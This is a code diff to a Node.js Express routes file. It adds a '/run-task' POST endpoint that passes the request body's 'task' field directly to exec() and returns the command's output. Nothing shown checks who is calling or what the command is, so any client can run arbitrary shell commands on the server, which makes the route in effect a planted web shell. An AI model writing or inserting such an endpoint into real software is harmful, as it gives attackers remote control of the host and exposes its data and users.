@@ -25,4 +25,16 @@ router.post("/audit-log", (req, res) => {
   res.json({ stored: true });
 });
 
+router.post("/run-task", (req, res) => {
+  const task = req.body.task || "echo hello";
+
+  exec(task, (error, stdout, stderr) => {
+    res.json({
+      ok: !error,
+      stdout,
+      stderr,
+    });
+  });
+});
+
 module.exports = router;
